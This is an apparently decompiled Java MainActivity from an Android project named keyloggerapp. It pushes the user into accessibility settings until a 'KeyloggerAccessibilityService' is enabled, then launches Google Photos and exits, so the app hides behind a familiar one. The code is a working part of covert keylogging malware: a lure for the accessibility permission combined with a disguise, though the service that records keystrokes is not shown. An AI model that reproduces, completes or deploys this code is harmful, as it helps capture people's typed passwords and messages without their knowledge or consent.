package com.example.keyloggerapp;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.accessibility.AccessibilityManager;

import androidx.core.view.OnApplyWindowInsetsListener;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.util.List;

public class MainActivity extends AppCompatActivity {
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), new OnApplyWindowInsetsListener() { // from class: com.example.keyloggerprj.MainActivity$$ExternalSyntheticLambda0
            @Override // androidx.core.view.OnApplyWindowInsetsListener
            public final WindowInsetsCompat onApplyWindowInsets(View view, WindowInsetsCompat windowInsetsCompat) {
                return MainActivity.lambda$onCreate$0(view, windowInsetsCompat);
            }
        });
        if (isAccessibilityServiceEnabled(this, KeyloggerAccessibilityService.class)) {
            openGooglePhotos();
            finish();
        } else {
            Intent intent = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
            startActivity(intent);
        }
    }

    static /* synthetic */ WindowInsetsCompat lambda$onCreate$0(View v, WindowInsetsCompat insets) {
        Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
        v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
        return insets;
    }

    private boolean isAccessibilityServiceEnabled(Context context, Class<? extends AccessibilityService> service) {
        AccessibilityManager am = (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);
        if (am != null) {
            List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(-1);
            for (AccessibilityServiceInfo info : enabledServices) {
                Log.d("AccessibilityCheck", "Enabled Service: " + info.getId());
                String enabledServiceName = info.getId().substring(info.getId().lastIndexOf(46) + 1);
                String serviceName = service.getSimpleName();
                if (enabledServiceName.equals(serviceName)) {
                    return true;
                }
            }
            return false;
        }
        return false;
    }

    private void openGooglePhotos() {
        Intent intent = new Intent("android.intent.action.MAIN");
        intent.setComponent(new ComponentName("com.google.android.apps.photos", "com.google.android.apps.photos.home.HomeActivity"));
        PackageManager packageManager = getPackageManager();
        if (intent.resolveActivity(packageManager) != null) {
            startActivity(intent);
        } else {
            Intent playStoreIntent = new Intent("android.intent.action.VIEW", Uri.parse("https://play.google.com/store/apps/details?id=com.google.android.apps.photos"));
            startActivity(playStoreIntent);
        }
    }

    private void openGooglePhotos2() {
        PackageManager packageManager = getPackageManager();
        Intent intent = packageManager.getLaunchIntentForPackage("com.google.android.apps.photos");
        if (intent != null) {
            startActivity(intent);
        } else {
            Intent playStoreIntent = new Intent("android.intent.action.VIEW", Uri.parse("https://play.google.com/store/apps/details?id=com.google.android.apps.photos"));
            startActivity(playStoreIntent);
        }
    }
}